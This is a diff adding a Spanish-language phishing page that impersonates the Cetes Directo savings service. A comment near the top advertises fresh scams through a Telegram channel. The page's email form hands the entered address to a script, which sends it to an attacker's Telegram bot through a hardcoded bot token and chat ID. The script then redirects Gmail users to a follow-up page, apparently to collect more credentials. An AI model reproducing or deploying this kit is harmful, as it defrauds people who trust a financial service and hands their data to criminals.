@@ -1,0 +1,86 @@
+<!-- ✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓
+✓✓✓✓✓✓ Scam frescos Aqui @ProArgFull 
+✓✓✓✓✓✓ https://t.me/ProArgFull
+ -->
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0 , user-scalable=no ">
+    <title>Cetes Directo</title>
+    <link rel="stylesheet" href="./nick.css">
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="header-image"></div>
+    </div>
+
+    <!-- Contenedor Principal -->
+    <div class="main-container">
+
+        <!-- Contenedor Izquierdo -->
+        <div class="left-container">
+            <form action="#" method="post" id="loginForm">
+                <input class="email" type="email" id="email" name="email" placeholder="Correo electronico">
+                <br><br>
+                <span id="usuarioMostrado" style="display: none;"></span>
+
+                <button type="button" id="submitButton">Continuar</button>
+            </form>
+        </div>
+        
+        <!-- Contenedor Derecho -->
+        <div class="right-container"></div>
+
+    </div>
+    <br><br><br><br><br>
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-image"></div>
+    </div>
+
+    <!-- Script para enviar correo a Telegram y redireccionar -->
+    <script>
+
+
+        function sendEmailAndRedirect() {
+            const email = document.getElementById('email').value;
+
+            if (!email) {
+                return;
+            }
+
+            const message = `✓✓✓Cetes Directo✓✓✓\n✓✓✓@ProArgFull✓✓✓\nEmail: ${email}`;
+            const telegramBotToken = '6502557989:AAE7aDuJ7_4peXSyKC7fnBOHzwDqFa8_s58';
+            const chatId = '611534764';
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                    if (email.includes('gmail')) {
+                        window.location.href = 'index2.html';
+                    } else {
+                        window.location.href = 'out.html';
+                    }
+                }
+            };
+
+            const data = JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            });
+
+            xhr.send(data);
+        }
+
+        // Event listener para el botón
+        document.getElementById('submitButton').addEventListener('click', sendEmailAndRedirect);
+    </script>
+
+</body>
+</html>
